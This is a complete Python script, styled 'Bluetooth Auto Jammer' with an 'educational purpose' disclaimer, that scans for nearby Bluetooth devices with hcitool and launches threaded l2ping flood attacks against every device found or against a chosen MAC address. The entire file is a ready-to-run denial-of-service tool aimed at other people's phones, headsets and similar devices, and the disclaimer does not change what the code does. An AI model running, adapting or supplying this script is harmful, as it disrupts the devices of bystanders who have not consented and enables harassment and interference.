import subprocess
import threading
import time
import os

ATTACK_THREADS = []

def scan_devices():
    print("[*] Scanning for Bluetooth devices...")
    try:
        result = subprocess.check_output("hcitool scan", shell=True).decode()
        devices = []
        for line in result.splitlines()[1:]:
            parts = line.strip().split("\t")
            if len(parts) == 2:
                addr, name = parts
                devices.append((addr.strip(), name.strip()))
        return devices
    except Exception as e:
        print(f"[!] Scan failed: {e}")
        return []

def attack_device(mac, name):
    print(f"[+] Attacking {name} ({mac}) with l2ping flood...")
    try:
        subprocess.call(f"l2ping -i hci0 -s 600 -f {mac}", shell=True)
    except KeyboardInterrupt:
        print(f"[-] Attack on {mac} stopped.")
    except Exception as e:
        print(f"[!] Error attacking {mac}: {e}")

def start_attack(devices):
    for addr, name in devices:
        t = threading.Thread(target=attack_device, args=(addr, name))
        t.daemon = True
        t.start()
        ATTACK_THREADS.append(t)
        time.sleep(0.5)  # Small delay to avoid overload

def attack_single_device():
    target_mac = input("[*] Enter the MAC address to attack: ").strip()
    target_name = input("[*] Enter the name of the target device: ").strip()
    
    if target_mac and target_name:
        print(f"\n[*] Starting DoS attack on {target_name} ({target_mac})...\n")
        attack_device(target_mac, target_name)
    else:
        print("[!] Invalid MAC address or name. Exiting...")

def main():
    os.system("clear")
    print("==== Bluetooth Auto Jammer ====")
    print("By Blackhat Venom (For Educational Purpose Only)\n")
    
    devices = scan_devices()

    if not devices:
        print("[!] No Bluetooth devices found.")
        return

    print("\nDevices found:")
    for i, (addr, name) in enumerate(devices):
        print(f"{i+1}. {name} - {addr}")

    confirm = input("\nStart DoS attack on ALL devices? (y/n): ").strip().lower()
    if confirm == 'y':
        try:
            start_attack(devices)
            print("\n[*] Attacking all devices. Press CTRL+C to stop.\n")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Stopped by user.")
    elif confirm == 'n':
        print("[*] Attack cancelled.")
        attack_single_device()
    else:
        print("[!] Invalid input. Exiting...")

if __name__ == "__main__":
    main()
